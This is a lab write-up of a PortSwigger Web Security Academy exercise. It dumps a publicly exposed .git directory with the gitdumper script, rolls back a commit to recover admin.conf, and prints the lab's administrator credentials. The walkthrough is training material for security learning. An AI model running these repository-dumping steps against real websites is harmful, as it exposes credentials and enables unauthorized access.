# Information Disclosure via Version Control History

This lab leaks sensitive data through its exposed version control history.

**Goal:** Recover the administrator's password, log in, and delete Carlos's account.

---

**Reference:** https://portswigger.net/web-security/information-disclosure/exploiting

pic 1

---

Lab URL generated: https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/

A `.git/` directory is accessible and allows directory listing:

pic 2

The gitdumper script (https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh) was downloaded and used to pull down the exposed `.git` repository:

```
bash gitdumper.sh https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/.git/ /tmp/a/
```

pic 3

Checking status shows sensitive files were removed in the most recent commit:

```
cd /tmp/a
git status
```

pic 4

Rolling back to the prior commit and reading the file reveals its contents:

```
git log
git reset --hard d3e84943424222ce64de7da0d797b7dfdef39ea1
cat admin.conf
```

pic 5

Logging in with the recovered credentials administrator:wy0szsn75q5jqn0w70bu and deleting the target user:

pic 6
